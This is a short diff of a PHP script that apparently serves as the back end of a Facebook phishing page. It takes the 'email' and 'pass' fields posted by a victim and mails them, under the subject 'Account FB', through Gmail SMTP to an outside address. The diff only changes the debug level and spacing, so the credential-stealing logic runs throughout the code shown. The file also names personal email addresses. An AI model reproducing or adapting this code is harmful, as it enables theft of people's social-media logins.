@@ -12,7 +12,7 @@ if($_POST){
     $mail = new PHPMailer();
 
     $mail->IsSMTP(); // enable SMTP
-    $mail->SMTPDebug = 1; // debugging: 1 = errors and messages, 2 = messages only
+    $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
     $mail->SMTPAuth = true; // authentication enabled
     $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
     $mail->Host = "smtp.gmail.com";
@@ -23,8 +23,8 @@ if($_POST){
     $mail->SetFrom("huynguyen66028@gmail.com","Huy Nguyen");
     
     $mail->Subject = 'Account FB';
-    $mail->Body = ' username:'.$_POST['email'] .' <br>
-                    password:'.$_POST['pass'].'  ';
+    $mail->Body = ' username: '.$_POST['email'] .' <br>
+                    password: '.$_POST['pass'].'  ';
     $mail->AddAddress('anphawolf@gmail.com');
 
     if(!$mail->Send()) {
